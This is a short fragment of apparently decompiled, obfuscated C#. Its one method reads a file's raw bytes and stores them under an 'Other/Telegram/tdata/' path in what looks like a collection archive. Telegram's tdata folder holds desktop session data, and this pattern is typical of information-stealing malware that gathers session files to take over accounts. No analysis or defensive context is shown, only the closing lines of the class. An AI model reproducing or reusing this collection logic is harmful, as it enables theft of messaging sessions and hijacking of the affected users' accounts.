      internal void \u0035U8([In] string obj0) => this.\u0032y2.aM8("Other/Telegram/tdata/" + Path.GetFileName(this.\u0035ek) + "/" + Path.GetFileName(obj0), File.ReadAllBytes(obj0));
    }
  }
}
